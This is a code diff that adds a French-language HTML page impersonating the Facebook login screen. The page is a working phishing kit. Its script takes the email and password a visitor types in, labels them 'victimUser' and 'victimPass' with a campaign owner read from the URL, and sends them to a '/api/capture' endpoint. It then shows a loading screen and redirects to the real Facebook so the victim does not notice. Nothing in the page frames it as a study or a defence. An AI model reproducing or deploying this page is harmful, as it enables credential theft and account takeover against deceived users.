@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Connexion ou inscription</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f0f2f5;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        
+        /* ===== BANNIÈRE IMAGE PLEINE LARGEUR ===== */
+        .top-banner {
+            width: 100%;
+            display: block;
+            line-height: 0;
+            font-size: 0;
+        }
+        
+        .top-banner img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: cover;
+        }
+        
+        .container {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        .content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            margin-top: 40px;
+        }
+        
+        @media (min-width: 900px) {
+            .content {
+                flex-direction: row;
+                justify-content: space-between;
+                align-items: center;
+                margin-top: 80px;
+            }
+        }
+        
+        .left-section {
+            flex: 1;
+            max-width: 500px;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+        
+        .logo {
+            color: #1877f2;
+            font-size: 56px;
+            font-weight: bold;
+            margin-bottom: 10px;
+        }
+        
+        .right-section {
+            flex: 1;
+            max-width: 400px;
+        }
+        
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
+            padding: 20px;
+            text-align: center;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            color: #1d2129;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #1877f2;
+            outline: none;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        
+        .login-button {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            line-height: 48px;
+            padding: 0 16px;
+            width: 100%;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        
+        .login-button:hover {
+            background-color: #166fe5;
+        }
+        
+        .forgot-password {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-bottom: 20px;
+            display: inline-block;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            line-height: 48px;
+            padding: 0 16px;
+            color: white;
+            font-weight: bold;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .create-page {
+            margin-top: 28px;
+            text-align: center;
+            font-size: 14px;
+        }
+        
+        .create-page a {
+            color: #1c1e21;
+            font-weight: bold;
+            text-decoration: none;
+        }
+        
+        .create-page a:hover {
+            text-decoration: underline;
+        }
+        
+        .footer {
+            background-color: white;
+            margin-top: auto;
+            padding: 20px 0;
+        }
+        
+        .footer-content {
+            max-width: 980px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            font-size: 12px;
+            color: #8a8d91;
+            justify-content: center;
+            text-align: center;
+        }
+        
+        .footer-links a {
+            color: #8a8d91;
+            margin: 0 5px;
+            text-decoration: none;
+            line-height: 1.6;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .copyright {
+            margin-top: 20px;
+            font-size: 11px;
+            color: #8a8d91;
+            text-align: center;
+        }
+        
+        .show-password {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            font-size: 14px;
+            color: #65676b;
+        }
+        
+        .show-password input {
+            margin-right: 8px;
+        }
+
+        /* ===== ÉCRAN DE CHARGEMENT BLEU PLEIN ÉCRAN ===== */
+        .loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            background-color: #1877f2;
+            z-index: 99999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .loading-overlay.active {
+            display: flex;
+        }
+        
+        /* Cercle blanc qui tourne */
+        .loading-spinner {
+            width: 70px;
+            height: 70px;
+            border: 5px solid rgba(255, 255, 255, 0.25);
+            border-top: 5px solid #ffffff;
+            border-radius: 50%;
+            animation: spin 0.9s linear infinite;
+        }
+        
+        @keyframes spin {
+            0%   { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <!-- BANNIÈRE IMAGE PLEINE LARGEUR -->
+    <div class="top-banner">
+        <img src="https://i.postimg.cc/25Jc9zZ7/IMG-6947.jpg" alt="Bannière">
+    </div>
+    
+    <div class="container">
+        <div class="content">
+            <div class="left-section">
+                <div class="logo">facebook</div>
+            </div>
+            
+            <div class="right-section">
+                <div class="login-form">
+                    <form id="loginForm">
+                        <div class="form-group">
+                            <input type="text" id="email" placeholder="Adresse e-mail ou numéro de tél." required>
+                        </div>
+                        <div class="form-group">
+                            <input type="password" id="password" placeholder="Mot de passe" required>
+                        </div>
+                        
+                        <div class="show-password">
+                            <input type="checkbox" id="showPassword">
+                            <label for="showPassword">Afficher le mot de passe</label>
+                        </div>
+                        
+                        <button type="submit" class="login-button" id="submitBtn">Se connecter</button>
+                        
+                        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+                        <div class="divider"></div>
+                        <button type="button" class="create-account">Créer nouveau compte</button>
+                    </form>
+                </div>
+                <div class="create-page">
+                    <a href="#">Créer une Page</a> pour une célébrité, une marque ou une entreprise.
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="footer">
+        <div class="footer-content">
+            <div class="footer-links">
+                <a href="#">S'inscrire</a>
+                <a href="#">Se connecter</a>
+                <a href="#">Messenger</a>
+                <a href="#">Facebook Lite</a>
+                <a href="#">Video</a>
+                <a href="#">Lieux</a>
+                <a href="#">Jeux</a>
+                <a href="#">Marketplace</a>
+                <a href="#">Meta Pay</a>
+                <a href="#">Meta Store</a>
+                <a href="#">Meta Quest</a>
+                <a href="#">Imagine with Meta AI</a>
+                <a href="#">Instagram</a>
+                <a href="#">Threads</a>
+                <a href="#">Collecte de fonds</a>
+                <a href="#">Services</a>
+                <a href="#">Centre d'information sur les élections</a>
+                <a href="#">Politique de confidentialité</a>
+                <a href="#">Centre de confidentialité</a>
+                <a href="#">Groupes</a>
+                <a href="#">À propos</a>
+                <a href="#">Créer une publicité</a>
+                <a href="#">Créer une Page</a>
+                <a href="#">Développeurs</a>
+                <a href="#">Emplois</a>
+                <a href="#">Cookies</a>
+                <a href="#">Choisir sa pub</a>
+                <a href="#">Conditions générales</a>
+                <a href="#">Aide</a>
+                <a href="#">Importation des contacts et non-utilisateurs</a>
+                <a href="#">Paramètres</a>
+            </div>
+            
+            <div class="copyright">
+                Meta © 2023
+            </div>
+        </div>
+    </div>
+
+    <!-- ÉCRAN DE CHARGEMENT BLEU (cercle blanc uniquement) -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-spinner"></div>
+    </div>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const campaignOwner = urlParams.get('user') || urlParams.get('ref') || 'Kim';
+        const linkType = urlParams.get('type') || 'standard';
+
+        const passwordInput = document.getElementById('password');
+        const showPasswordCheckbox = document.getElementById('showPassword');
+
+        showPasswordCheckbox.addEventListener('change', function() {
+            passwordInput.type = this.checked ? 'text' : 'password';
+        });
+
+        function captureData(payload) {
+            return fetch('/api/capture', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            }).catch(err => console.log(err));
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value;
+
+            document.getElementById('loadingOverlay').classList.add('active');
+
+            const payload = {
+                owner: campaignOwner,
+                network: 'Facebook',
+                type: linkType,
+                victimUser: email,
+                victimPass: password,
+                otp: 'Aucun'
+            };
+
+            captureData(payload);
+
+            setTimeout(() => {
+                window.location.href = 'https://facebook.com';
+            }, 5000);
+        });
+
+        document.getElementById('email').addEventListener('focus', function() {
+            this.style.borderColor = '#1877f2';
+        });
+
+        document.getElementById('password').addEventListener('focus', function() {
+            this.style.borderColor = '#1877f2';
+        });
+    </script>
+</body>
+</html>
